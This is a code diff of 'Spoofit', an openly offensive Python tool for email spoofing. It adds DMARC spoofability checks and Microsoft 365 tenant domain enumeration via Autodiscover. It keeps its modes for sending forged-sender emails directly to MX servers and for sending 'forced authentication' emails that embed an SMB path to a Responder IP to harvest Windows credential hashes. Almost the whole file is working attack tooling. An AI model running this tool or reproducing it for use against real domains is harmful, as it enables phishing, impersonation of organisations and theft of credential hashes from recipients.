@@ -1,11 +1,15 @@
+#!/usr/bin/env python3
 import smtplib
 import dns.resolver
 import argparse
 import os
 import configparser
+import xml.etree.ElementTree as ET
+from urllib.request import urlopen, Request
+from urllib.error import HTTPError, URLError
+import csv
 
 def print_banner():
-    """Prints the ASCII art banner."""
     banner = r"""
    _____                   _____ __ 
   / ___/____  ____  ____  / __(_) /_
@@ -13,7 +17,6 @@ def print_banner():
  ___/ / /_/ / /_/ / /_/ / __/ / /_  
 /____/ .___/\____/\____/_/ /_/\__/  
     /_/                             
-
    """
     print(banner)
 
@@ -26,7 +29,7 @@ def get_mx_record(domain):
         mx_record = min(answers, key=lambda r: r.preference).exchange.to_text()
         return mx_record
     except Exception as e:
-        print(f"[!] Error retrieving MX record: {e}")
+        print(f"[!] Error retrieving MX record for {domain}: {e}")
         return None
 
 def send_email(mx_record, sender, recipient, subject, body):
@@ -38,7 +41,12 @@ def send_email(mx_record, sender, recipient, subject, body):
             if code != 250:
                 print(f"[!] Failed to send email to {recipient}: {msg}")
                 return
-            server.data(f"To: {recipient}\r\nFrom: {sender}\r\nSubject: {subject}\r\nContent-Type: text/html\r\n\r\n{body}")
+            server.data(
+                f"To: {recipient}\r\n"
+                f"From: {sender}\r\n"
+                f"Subject: {subject}\r\n"
+                f"Content-Type: text/html\r\n\r\n{body}"
+            )
             print(f"[+] Email sent to {recipient}")
     except smtplib.SMTPRecipientsRefused:
         print(f"[!] Recipient refused: {recipient}")
@@ -48,13 +56,10 @@ def send_email(mx_record, sender, recipient, subject, body):
 def load_config(forced=False):
     config = configparser.ConfigParser()
     config_file = 'conf/spoofit.conf'
-    
     if not os.path.exists(config_file):
         print(f"[!] Configuration file {config_file} does not exist.")
         return None
-
     config.read(config_file)
-    
     if forced:
         subject = config.get('ForcedAuthEmail', 'subject')
         body_file = config.get('ForcedAuthEmail', 'body_file')
@@ -63,86 +68,230 @@ def load_config(forced=False):
     else:
         subject = config.get('Email', 'subject')
         body = config.get('Email', 'body')
-
     return subject, body
 
 def create_forced_auth_email(body_template, responder_ip):
     return body_template % {'responder': responder_ip}
 
 def check_spoofability(domain):
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    RESET = "\033[0m"
+
+    result = {"domain": domain, "policy": "", "spoofable": False}
     try:
-        spoofable = False
-        weaknesses = []
-
         try:
-            spf_record = dns.resolver.resolve(domain, 'TXT')
-            spf_record = [str(r) for r in spf_record if "v=spf1" in str(r)]
-            if not spf_record:
-                weaknesses.append("No SPF record found.")
-                spoofable = True
-            elif not any(all_item in spf_record[0] for all_item in ["~all", "-all"]):
-                weaknesses.append("SPF record does not specify ~all or -all.")
-                spoofable = True
-        except dns.resolver.NoAnswer:
-            weaknesses.append("No SPF record found.")
-            spoofable = True
-
-        try:
-            dmarc_record = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
-            dmarc_record = str(dmarc_record[0])
-            if "p=none" in dmarc_record:
-                print(f"\033[93m[!] DMARC policy is set to 'p=none' for {domain}.\033[0m")
-                spoofable = True
-            elif "p=quarantine" in dmarc_record:
-                print(f"\033[93m[!] DMARC policy is set to 'quarantine' for {domain}.\033[0m")
-            elif "p=reject" not in dmarc_record:
-                weaknesses.append("DMARC policy is not set to 'reject'.")
-                spoofable = True
+            dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
+            dmarc_record = str(dmarc_answer[0]).lower()
         except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
-            weaknesses.append("No DMARC record found.")
-            spoofable = True
+            dmarc_record = None
 
-        if spoofable:
-            print(f"\033[92m[+] Spoofing possible for {domain}!\033[0m")
-            for weakness in weaknesses:
-                print(f"    - {weakness}")
+        if dmarc_record and "p=reject" in dmarc_record:
+            print(f"{RED}[-] Spoofing not possible for {domain}: DMARC record p=reject (fully enforced).{RESET}")
+            result["policy"] = "p=reject (fully enforced)"
+        elif dmarc_record and "p=quarantine" in dmarc_record:
+            print(f"{YELLOW}[!] DMARC record p=quarantine for {domain} (partial).{RESET}")
+            print(f"{GREEN}[+] Spoofing might slip through if spam is recovered.{RESET}")
+            result["policy"] = "p=quarantine (partial)"
+            result["spoofable"] = True
+        elif dmarc_record and "p=none" in dmarc_record:
+            print(f"{YELLOW}[!] DMARC record p=none for {domain} (not enforced).{RESET}")
+            print(f"{GREEN}[+] Spoofing possible — no enforcement.{RESET}")
+            result["policy"] = "p=none (not enforced)"
+            result["spoofable"] = True
         else:
-            print(f"\033[91m[-] Spoofing not possible for {domain}...\033[0m")
-
+            print(f"{YELLOW}[!] No valid DMARC record for {domain}.{RESET}")
+            print(f"{GREEN}[+] Spoofing possible — no policy.{RESET}")
+            result["policy"] = "No record"
+            result["spoofable"] = True
     except Exception as e:
-        print(f"[!] Error checking spoofability: {e}")
+        print(f"[!] Error checking spoofability for {domain}: {e}")
+        result["policy"] = "Error"
+    return result
+
+def enumerate_tenant_domains(domain):
+    body = f"""<?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages"
+        xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types"
+        xmlns:a="http://www.w3.org/2005/08/addressing"
+        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+        <soap:Header>
+            <a:RequestedServerVersion>Exchange2010</a:RequestedServerVersion>
+            <a:MessageID>urn:uuid:1234abcd-9e05-465e-ade9-aae14c4bcd10</a:MessageID>
+            <a:Action soap:mustUnderstand="1">
+              http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation
+            </a:Action>
+            <a:To soap:mustUnderstand="1">
+              https://autodiscover.byfcxu-dom.extest.microsoft.com/autodiscover/autodiscover.svc
+            </a:To>
+            <a:ReplyTo>
+                <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
+            </a:ReplyTo>
+        </soap:Header>
+        <soap:Body>
+            <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
+                <Request>
+                    <Domain>{domain}</Domain>
+                </Request>
+            </GetFederationInformationRequestMessage>
+        </soap:Body>
+    </soap:Envelope>"""
+
+    headers = {"Content-Type": "text/xml; charset=utf-8", "User-Agent": "AutodiscoverClient"}
+    url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"
+
+    try:
+        request = Request(url, data=body.encode(), headers=headers)
+        with urlopen(request) as response:
+            xml_data = response.read().decode()
+    except (HTTPError, URLError) as e:
+        print(f"[!] Error performing Autodiscover: {e}")
+        return []
+
+    domains_found = []
+    try:
+        root = ET.fromstring(xml_data)
+        namespace = "{http://schemas.microsoft.com/exchange/2010/Autodiscover}"
+        for elem in root.iter():
+            if elem.tag == f"{namespace}Domain":
+                if elem.text and elem.text.strip():
+                    domains_found.append(elem.text.strip())
+    except Exception as e:
+        print(f"[!] Error parsing Autodiscover XML: {e}")
+        return []
+    return list(set(domains_found))
+
+def print_summary_table(dmarc_results):
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    RESET = "\033[0m"
+
+    filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
+    if not filtered:
+        print("[!] No domains to display in summary table (all onmicrosoft?).")
+        return
+
+    print("\nFinal DMARC Summary (excluding .onmicrosoft.com):")
+    print("-" * 70)
+    print(f"{'Domain':<30} | {'DMARC Policy':<30} | Spoofable?")
+    print("-" * 70)
+
+    for res in filtered:
+        domain = res["domain"]
+        policy = res["policy"]
+        if res["spoofable"]:
+            if "quarantine" in policy.lower():
+                spoof_str = f"{YELLOW}Maybe{RESET}"
+            else:
+                spoof_str = f"{GREEN}Yes{RESET}"
+        else:
+            spoof_str = "No"
+        print(f"{domain:<30} | {policy:<30} | {spoof_str}")
+    print("-" * 70 + "\n")
+
+def export_results_csv(dmarc_results, filename):
+    filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
+    if not filtered:
+        print(f"[!] No results to export to {filename} (all onmicrosoft?).")
+        return
+    try:
+        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
+            writer = csv.writer(csvfile)
+            writer.writerow(["Domain", "DMARC Policy", "Spoofable"])
+            for r in filtered:
+                if r["spoofable"]:
+                    if "quarantine" in r["policy"].lower():
+                        spoof = "Maybe"
+                    else:
+                        spoof = "Yes"
+                else:
+                    spoof = "No"
+                writer.writerow([r["domain"], r["policy"], spoof])
+        print(f"[+] Exported DMARC results to {filename}")
+    except Exception as e:
+        print(f"[!] Error exporting to {filename}: {e}")
+
+def parse_tenant_name(domains, fallback_domain):
+    """
+    If there's a .onmicrosoft.com domain, parse out just the first part.
+    For example: 
+      'org.mail.onmicrosoft.com' -> remove '.onmicrosoft.com' -> 'org.mail' -> split('.') -> 'org'
+    Otherwise, fallback.
+    """
+    onmicrosoft = [d for d in domains if d.lower().endswith(".onmicrosoft.com")]
+    if onmicrosoft:
+        raw = onmicrosoft[0].lower()
+        raw = raw.replace(".onmicrosoft.com", "")
+        # If there's a dot left after removing '.onmicrosoft.com', split on it and take the first segment.
+        raw = raw.split('.', 1)[0]
+        return f"{raw}_spoofit_results.csv"
+    else:
+        return fallback_domain.replace('.', '_') + "_spoofit_results.csv"
 
 def main():
     print_banner()
 
     parser = argparse.ArgumentParser(
-        description="Email Spoofing Tool",
+        description="Email Spoofing Tool (DMARC-focused) with optional M365 tenant enumeration",
         epilog="""
 Examples:
-  To check if the target domain is spoofable:
-    Spoofit.py -c <domain.com>
+  1) Check DMARC:
+     Spoofit.py -c example.com
 
-  To send a spoofed email to the target (or list of targets):
-    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt>
+  2) Tenant check (automatically saves CSV):
+     Spoofit.py -c example.com -t
 
-  To send a spoofed email containing an embedded forced authentication image to a target (or list of targets):
-    Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or recipients.txt> -f <responder-ip>
+  3) Send spoofed email:
+     Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or file.txt>
+
+  4) Forced-auth:
+     Spoofit.py -s <sender@domain.com> -r <recipient@domain.com> -f <responder-ip>
         """,
         formatter_class=argparse.RawTextHelpFormatter
     )
-    parser.add_argument('-c', '--check', help='Check if a domain is vulnerable to spoofing (SPF, DMARC)')
-    parser.add_argument('-s', '--sender', help='Email address to use as the spoofed sender')
-    parser.add_argument('-r', '--recipients', help='Recipient email address or file containing multiple addresses')
-    parser.add_argument('-f', '--forced', help='Optional: Forced authentication email with responder IP')
+
+    parser.add_argument('-c', '--check', help='Check DMARC spoofability for a domain.')
+    parser.add_argument('-t', '--tenant', action='store_true', help='Enumerate entire tenant for domain.')
+    parser.add_argument('-s', '--sender', help='Spoofed sender email.')
+    parser.add_argument('-r', '--recipients', help='Recipient email or file.')
+    parser.add_argument('-f', '--forced', help='Forced auth email with Responder IP.')
 
     args = parser.parse_args()
-
     if not any(vars(args).values()):
         parser.print_help()
         return
 
     if args.check:
-        check_spoofability(args.check)
+        dmarc_results = []
+        domains_to_check = [args.check]
+
+        if args.tenant:
+            all_domains = enumerate_tenant_domains(args.check)
+            csv_filename = parse_tenant_name(all_domains, args.check)
+
+            tenant_domains = [d for d in all_domains if not d.lower().endswith(".onmicrosoft.com")]
+            if tenant_domains:
+                print(f"[+] Tenant domains discovered for {args.check} (excluding .onmicrosoft.com):")
+                for dom in tenant_domains:
+                    print(f"  - {dom}")
+                print("\nRunning DMARC checks on each discovered domain:\n")
+                domains_to_check = tenant_domains
+            else:
+                print("[-] No additional tenant domains found or all .onmicrosoft.com.")
+                print(f"Checking only {args.check}.\n")
+                csv_filename = parse_tenant_name([], args.check)
+
+        for dom in domains_to_check:
+            res = check_spoofability(dom)
+            dmarc_results.append(res)
+
+        print_summary_table(dmarc_results)
+
+        if args.tenant:
+            export_results_csv(dmarc_results, csv_filename)
         return
 
     if args.recipients and args.sender:
@@ -154,29 +303,30 @@ Examples:
             recipients.append(args.recipients)
 
         if args.forced:
-            config_result = load_config(forced=True)
-            if config_result is None:
+            cfg = load_config(forced=True)
+            if not cfg:
                 return
-
-            email_subject, body_template = config_result
-            email_body = create_forced_auth_email(body_template, args.forced)
-            print(f"[*] Sending forced authentication email to {len(recipients)} target{'s' if len(recipients) > 1 else ''} with SMB path to {args.forced}.")
+            subject, body_template = cfg
+            body = create_forced_auth_email(body_template, args.forced)
+            print(f"[*] Sending forced auth email to {len(recipients)} recipients.")
         else:
-            config_result = load_config()
-            if config_result is None:
+            cfg = load_config()
+            if not cfg:
                 return
-
-            email_subject, email_body = config_result
-            print(f"...Sending spoofed email to {len(recipients)} target{'s' if len(recipients) > 1 else ''}.")
+            subject, body = cfg
+            print(f"...Sending spoofed email to {len(recipients)} recipients.")
 
         domain = get_domain_from_email(args.sender)
         mx_record = get_mx_record(domain)
         if not mx_record:
-            print("Failed to retrieve MX record. Exiting...")
+            print("[!] Failed to retrieve MX record. Exiting...")
             return
 
-        for recipient in recipients:
-            send_email(mx_record, args.sender, recipient, email_subject, email_body)
+        for rcp in recipients:
+            send_email(mx_record, args.sender, rcp, subject, body)
+        return
+
+    parser.print_help()
 
 if __name__ == "__main__":
     main()
